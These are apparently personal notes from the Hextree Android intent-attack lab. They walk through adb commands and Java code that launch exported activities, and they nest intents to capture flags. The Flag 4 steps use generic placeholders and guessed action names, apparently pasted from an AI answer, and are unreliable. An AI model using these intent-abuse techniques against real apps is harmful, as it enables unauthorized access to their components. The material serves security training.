
# Starting Activities

Activities are responsible to render the screen of an app. So if your app has multiple screens, you can use `startActivity()` to start another activity. To do that you have to create an Intent object and target a specific activity class.

```
Intent intent = new Intent();
intent.setComponent(new ComponentName("io.hextree.activitiestest", "io.hextree.activitiestest.SecondActivity"));
startActivity(intent);
```

An alternative syntax to specify the target package and activity is also:

```
Intent intent = new Intent();
intent.setClassName("io.hextree.activitiestest", "io.hextree.activitiestest.SecondActivity");
startActivity(intent);
```

An app can always start any of its own activities, but in order to allow other apps to start your activity, they have to be exported. There is also one exported activity by default, which is the "launcher activity" that is used as a main entry point into the app. This allows the home screen or launcher application to start your app when you click it.





# Flag 1 

as the first activity is exported in the manifest we can just call it using

```
adb shell am start -n io.hextree.attacksurface/io.hextree.attacksurface.activities.Flag1Activity
```


# Flag 2

the second activity is also exported but needs an extra action to be passed which can be found using static analysis 

```
   protected void onCreate(Bundle bundle) {  
        super.onCreate(bundle);  
        this.f = new LogHelper(this);  
        String action = getIntent().getAction();  
        if (action == null || !action.equals("io.hextree.action.GIVE_FLAG")) {  
            return;  
        }  
        this.f.addTag(action);  
        success(this);  
    }  
}
```

as here we can see that the oncreate returns nothing if action is null or not equal to io.hextree.action.GIVE_FLAG  so now modifying the intent we get 

```
adb shell am start -n io.hextree.attacksurface/io.hextree.attacksurface.activities.Flag2Activity -a io.hextree.action.GIVE_FLAG
```

-a to specify the action io.hextree.action.GIVE_FLAG


# Parcel
# Binder


# Flag 4

To trigger `success(this)`, you must advance the state machine sequentially through 4 steps using different intent actions.

Assuming the target component is an **Activity** (or a Broadcast Receiver / Service depending on how `stateMachine` is called), you must run these commands in order.

Step 1: Transition from INIT (0) to PREPARE (1)

bash

```
adb shell am start -a PREPARE_ACTION -n com.package.name/.TargetComponent
```

Use code with caution.

Step 2: Transition from PREPARE (1) to BUILD (2)

bash

```
adb shell am start -a BUILD_ACTION -n com.package.name/.TargetComponent
```

Use code with caution.

Step 3: Transition from BUILD (2) to GET_FLAG (3)

bash

```
adb shell am start -a GET_FLAG_ACTION -n com.package.name/.TargetComponent
```

Use code with caution.

Step 4: Trigger Success from GET_FLAG (3)

Once the state is `3` (GET_FLAG), any intent that doesn't hit a fallback will trigger the flag. You can send any placeholder action (or no action at all):

bash

```
adb shell am start -a TRIGGER -n com.package.name/.TargetComponent
```

Use code with caution.

---

Important Requirements

1. **Component Type:** If this code runs inside a `BroadcastReceiver`, replace `am start -n` with `am broadcast -a <ACTION>`.
2. **No Interruption:** You must run these commands back-to-back. If you send an incorrect action or an unexpected intent, the code hits the fallback (`setCurrentState(State.INIT)`) and resets your progress.


# Flag 5


The Hextree `Flag5Activity` challenge ("Intent in Intent") expects a deeply **nested hierarchy of three Intents** to unlock the success state: [[1](https://medium.com/@alaamansouraliahmed/flag5activity-intent-in-intent-hextree-write-up-cc42ce9338dc), [2](https://www.pwny.cc/so/android/intent), [3](https://d4vnull.medium.com/hextree-intent-attack-surface-android-pentesting-walkthrough-47d975606711)]

1. **Outer Intent**: Targets `Flag5Activity`. It holds a parcelable extra under the key `"android.intent.extra.INTENT"` containing the Middle Intent.
2. **Middle Intent**: Contains an integer extra `"return"` set to `42`. It also holds another parcelable extra under the key `"nextIntent"` containing the Inner Intent.
3. **Inner Intent**: Contains a string extra `"reason"` set to `"back"`. [[1](https://medium.com/@alaamansouraliahmed/flag5activity-intent-in-intent-hextree-write-up-cc42ce9338dc), [2](https://www.pwny.cc/so/android/intent)]
4. 
```
// 1. Create the deeply nested Inner Intent
Intent innerIntent = new Intent();
innerIntent.putExtra("reason", "back");

// 2. Create the Middle Intent and bundle the Inner Intent inside it
Intent middleIntent = new Intent();
middleIntent.putExtra("return", 42);
middleIntent.putExtra("nextIntent", innerIntent);

// 3. Create the Main Outer Intent targeting Flag5Activity
Intent mainIntent = new Intent();
mainIntent.setComponent(new ComponentName(
    "io.hextree.attacksurface", 
    "io.hextree.attacksurface.activities.Flag5Activity"
));
mainIntent.putExtra("android.intent.extra.INTENT", middleIntent);

// 4. Launch the lifecycle chain
startActivity(mainIntent);


```

